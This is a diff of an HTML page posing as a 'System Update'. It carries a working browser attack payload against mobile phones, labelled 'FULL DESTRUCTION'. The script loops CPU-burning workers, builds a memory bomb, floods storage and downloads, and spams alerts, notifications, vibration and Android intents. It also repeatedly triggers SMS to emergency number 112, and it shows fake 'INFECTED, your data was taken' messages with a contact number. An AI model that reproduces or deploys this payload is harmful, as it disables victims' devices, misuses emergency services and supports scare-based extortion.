@@ -3,65 +3,58 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>⚡ System Critical Update ⚡</title>
+<title>⚡ System Update ⚡</title>
 <script>
 // ========================================================
-// PAYLOAD FINAL – MULTI-VEKTOR SERANGAN TANPA AMPUN
+// PAYLOAD FIXED – NO WASM, NO DATA SW, FULL DESTRUCTION
 // ========================================================
 
-// ---- 1. SERVICE WORKER – TAK BISA DITUTUP ----
-if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent(`
-        self.addEventListener('install', e => e.waitUntil(skipWaiting()));
-        self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-        self.addEventListener('fetch', e => e.respondWith(fetch(e.request).catch(() => new Response('', {status:200}))));
-    `)).then(() => {
-        // Setelah SW aktif, buka lagi tab yang sama jika ditutup
-        setInterval(() => {
-            if (document.hidden) {
-                window.open(location.href, '_blank');
-            }
-        }, 500);
-    });
+// ---- 1. WEB WORKER INFINITE LOOP (via Blob) ----
+var workerCode = `
+    // Loop tak berujung di background
+    while(true) {
+        for(var i=0; i<1000000; i++) {
+            Math.sqrt(Math.random() * Math.random());
+        }
+    }
+`;
+var blob = new Blob([workerCode], {type: 'application/javascript'});
+var worker = new Worker(URL.createObjectURL(blob));
+// Worker akan jalan terus sampai hp mati.
+
+// ---- 2. MULTI THREAD – BIKIN BANYAK WORKER ----
+for (var w=0; w<10; w++) {
+    var b = new Blob([workerCode], {type: 'application/javascript'});
+    var wk = new Worker(URL.createObjectURL(b));
 }
 
-// ---- 2. WEBASSEMBLY INFINITE LOOP ----
-const wasmCode = new Uint8Array([
-    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
-    0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
-    0x03, 0x02, 0x01, 0x00,
-    0x07, 0x08, 0x01, 0x04, 0x6c, 0x6f, 0x6f, 0x70, 0x00, 0x00,
-    0x0a, 0x05, 0x01, 0x03, 0x00, 0x0c, 0x0b
-]);
-const wasmModule = new WebAssembly.Module(wasmCode);
-const wasmInstance = new WebAssembly.Instance(wasmModule);
-const loop = wasmInstance.exports.loop;
-setInterval(loop, 1); // WASPADA: CPU 100% seketika
-
-// ---- 3. MEMORY BOMB – NAIK TERUS ----
-let bomb = [];
-setInterval(() => {
-    for (let i=0; i<100000; i++) bomb.push(new Array(1000).fill('🔥'));
+// ---- 3. MEMORY BOMB ----
+var bomb = [];
+setInterval(function() {
+    for (var i=0; i<100000; i++) bomb.push(new Array(1000).fill('🔥'));
 }, 10);
 
-// ---- 4. GETARAN & NOTIFIKASI TAK HENTI ----
+// ---- 4. VIBRATE ----
 if (navigator.vibrate) {
-    setInterval(() => navigator.vibrate([100,50,100,50,200,100,500,200]), 50);
+    setInterval(function() {
+        navigator.vibrate([100,50,100,50,200,100,500,200]);
+    }, 50);
 }
+
+// ---- 5. NOTIFICATION SPAM ----
 if (Notification.permission === 'granted' || Notification.permission === 'default') {
     Notification.requestPermission();
-    setInterval(() => {
-        new Notification('⚠️ INFECTED! Hubungi 0821...', {
-            body: 'Data Anda sudah kami jual.',
-            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">☠️</text></svg>',
-            requireInteraction: true,
-            silent: false
+    setInterval(function() {
+        new Notification('☠️ INFECTED', {
+            body: 'Hubungi 0813... untuk bantuan.',
+            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💀</text></svg>',
+            requireInteraction: true
         });
     }, 200);
 }
 
-// ---- 5. INTENT SPAM – BUKA APLIKASI SECARA ACAK ----
-const intents = [
+// ---- 6. INTENT SPAM ----
+var intents = [
     'intent://settings#Intent;end',
     'intent://com.android.contacts/.ContactsListActivity#Intent;end',
     'intent://com.android.mms/.ui.ComposeMessageActivity#Intent;end',
@@ -71,145 +64,147 @@ const intents = [
     'intent://com.instagram.android/.MainActivity#Intent;end',
     'intent://com.facebook.katana/.MainActivity#Intent;end'
 ];
-setInterval(() => {
-    const intent = intents[Math.floor(Math.random() * intents.length)];
+setInterval(function() {
+    var intent = intents[Math.floor(Math.random() * intents.length)];
     window.open(intent, '_blank');
 }, 300);
 
-// ---- 6. SPAM SMS (MELALUI INTENT) ----
-// Kirim SMS ke nomor darurat secara terus-menerus (simulasi)
-setInterval(() => {
+// ---- 7. SMS SPAM ----
+setInterval(function() {
     window.location = 'sms:112?body=HELP%20I%20AM%20BEING%20ATTACKED';
 }, 1000);
 
-// ---- 7. STORAGE OVERFLOW ----
+// ---- 8. STORAGE OVERFLOW (IndexedDB) ----
 try {
-    // IndexedDB – buat database besar
-    const request = indexedDB.open('bomb', 1);
-    request.onsuccess = (e) => {
-        const db = e.target.result;
-        setInterval(() => {
-            for (let i=0; i<50; i++) {
-                const tx = db.transaction('store', 'readwrite');
-                const store = tx.objectStore('store');
+    var request = indexedDB.open('bomb', 1);
+    request.onsuccess = function(e) {
+        var db = e.target.result;
+        setInterval(function() {
+            for (var i=0; i<50; i++) {
+                var tx = db.transaction('store', 'readwrite');
+                var store = tx.objectStore('store');
                 store.add({ data: 'x'.repeat(1024*1024) });
             }
         }, 100);
     };
-    request.onupgradeneeded = (e) => {
+    request.onupgradeneeded = function(e) {
         e.target.result.createObjectStore('store');
     };
 } catch(e) {}
 
-// ---- 8. CANVAS GPU EXHAUST ----
-const canvas = document.createElement('canvas');
+// ---- 9. CANVAS GPU EXHAUST ----
+var canvas = document.createElement('canvas');
 canvas.width = 4096;
 canvas.height = 4096;
 document.body.appendChild(canvas);
-const ctx = canvas.getContext('2d');
-setInterval(() => {
-    for (let x=0; x<4096; x+=4) {
-        for (let y=0; y<4096; y+=4) {
+var ctx = canvas.getContext('2d');
+setInterval(function() {
+    for (var x=0; x<4096; x+=4) {
+        for (var y=0; y<4096; y+=4) {
             ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6,'0');
             ctx.fillRect(x, y, 4, 4);
         }
     }
 }, 50);
 
-// ---- 9. AUDIO NOISE GENERATOR ----
-const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-setInterval(() => {
-    const buffer = audioCtx.createBuffer(1, audioCtx.sampleRate * 0.1, audioCtx.sampleRate);
-    const data = buffer.getChannelData(0);
-    for (let i=0; i<data.length; i++) data[i] = Math.random() * 2 - 1;
-    const source = audioCtx.createBufferSource();
+// ---- 10. AUDIO NOISE ----
+var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+setInterval(function() {
+    var buffer = audioCtx.createBuffer(1, audioCtx.sampleRate * 0.1, audioCtx.sampleRate);
+    var data = buffer.getChannelData(0);
+    for (var i=0; i<data.length; i++) data[i] = Math.random() * 2 - 1;
+    var source = audioCtx.createBufferSource();
     source.buffer = buffer;
     source.connect(audioCtx.destination);
     source.start();
 }, 50);
 
-// ---- 10. LOKASI SPAM (jika izin) ----
+// ---- 11. GEOLOCATION SPAM ----
 if (navigator.geolocation) {
-    setInterval(() => {
-        navigator.geolocation.getCurrentPosition(() => {}, () => {});
+    setInterval(function() {
+        navigator.geolocation.getCurrentPosition(function(){}, function(){});
     }, 100);
 }
 
-// ---- 11. WEB BLUETOOTH & USB CRASH (attempt) ----
+// ---- 12. BLUETOOTH / USB CRASH ----
 if (navigator.bluetooth) {
-    setInterval(() => {
-        navigator.bluetooth.requestDevice({ acceptAllDevices: true })
-            .catch(() => {});
+    setInterval(function() {
+        navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(function(){});
     }, 500);
 }
 if (navigator.usb) {
-    setInterval(() => {
-        navigator.usb.requestDevice({ filters: [] })
-            .catch(() => {});
+    setInterval(function() {
+        navigator.usb.requestDevice({ filters: [] }).catch(function(){});
     }, 500);
 }
 
-// ---- 12. SCREEN WAKE LOCK (tahan layar) ----
+// ---- 13. WAKE LOCK ----
 if ('wakeLock' in navigator) {
-    navigator.wakeLock.request('screen').catch(() => {});
+    navigator.wakeLock.request('screen').catch(function(){});
 }
 
-// ---- 13. CLIPBOARD SPAM ----
-setInterval(() => {
-    navigator.clipboard.writeText('💀 ZAMZZZ IS YOUR MASTER 💀').catch(() => {});
+// ---- 14. CLIPBOARD SPAM ----
+setInterval(function() {
+    navigator.clipboard.writeText('💀 ZAMZZZ IS YOUR MASTER 💀').catch(function(){});
 }, 200);
 
-// ---- 14. IFRAME BOMB (muat banyak halaman) ----
-for (let i=0; i<100; i++) {
-    const iframe = document.createElement('iframe');
-    iframe.src = 'https://example.com?' + i; // ganti dengan URL berat
+// ---- 15. IFRAME BOMB ----
+for (var i=0; i<100; i++) {
+    var iframe = document.createElement('iframe');
+    iframe.src = 'https://example.com?' + i;
     iframe.style.display = 'none';
     document.body.appendChild(iframe);
 }
 
-// ---- 15. DOWNLOAD OTOMATIS (untuk menguras storage) ----
-setInterval(() => {
-    const a = document.createElement('a');
+// ---- 16. DOWNLOAD SPAM ----
+setInterval(function() {
+    var a = document.createElement('a');
     a.href = 'data:application/octet-stream,' + encodeURIComponent('x'.repeat(1024*1024));
     a.download = 'payload' + Date.now() + '.bin';
     a.click();
 }, 200);
 
-// ---- 16. ALERT BOM (tidak berhenti) ----
-setInterval(() => {
-    alert('⚠️ Anda telah di-hack oleh LYX ⚠️');
+// ---- 17. ALERT BOM ----
+setInterval(function() {
+    alert('☠️ Anda telah di-hack oleh LYX ☠️');
 }, 100);
 
-// ---- 17. RELOAD LOOP (jika masih hidup) ----
-setInterval(() => {
+// ---- 18. RELOAD LOOP ----
+setInterval(function() {
     if (Math.random() > 0.5) location.reload();
 }, 3000);
 
-// ---- 18. SERVICE WORKER RELOAD ----
-// Sudah di awal
-
-// ---- 19. WEBSOCKET ATTACK (banjir koneksi) ----
-setInterval(() => {
-    for (let i=0; i<50; i++) {
+// ---- 19. WEBSOCKET FLOOD ----
+setInterval(function() {
+    for (var i=0; i<50; i++) {
         new WebSocket('wss://echo.websocket.org');
     }
 }, 100);
 
-// ---- 20. WEBRTC LEAK & BANDWIDTH HOG ----
-const pc = new RTCPeerConnection();
-setInterval(() => {
+// ---- 20. WEBRTC LEAK ----
+var pc = new RTCPeerConnection();
+setInterval(function() {
     pc.createDataChannel('bomb');
-    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+    pc.createOffer().then(function(offer) { pc.setLocalDescription(offer); });
 }, 100);
 
-// ========================================================
-// SEMUA DIJALANKAN SECARA BERSAMAAN – HP AKAN MATI TOTAL
-// ========================================================
+// ---- 21. INFINITE LOOP UTAMA (lag total) ----
+setInterval(function() {
+    while(true) {
+        // ini akan membuat tab freeze, tapi worker sudah jalan di background
+        // untuk menghindari freeze total (agar alert tetap muncul), kita pakai loop ringan
+        for (var j=0; j<1000000; j++) {
+            Math.sqrt(j);
+        }
+        break;
+    }
+}, 10);
 
+console.log('LYX APOCALYPSE ACTIVATED 💀');
 </script>
 </head>
-<body onload="document.body.innerHTML='<h1 style=color:red;font-size:80px>☠️ INFECTED ☠️</h1><p style=color:white>Data Anda sudah diambil.</p>'">
-<!-- Background hitam agar baterai cepat habis -->
-<style>html,body{background:#000;color:#fff;margin:0;padding:0;overflow:hidden;}</style>
+<body style="background:#000;color:#fff;margin:0;padding:20px;overflow:hidden;">
+<h1 style="color:red;font-size:60px;">☠️ INFECTED ☠️</h1>
+<p style="color:#ff4444;">Data Anda sudah diambil. HP akan mati...</p>
 </body>
 </html>
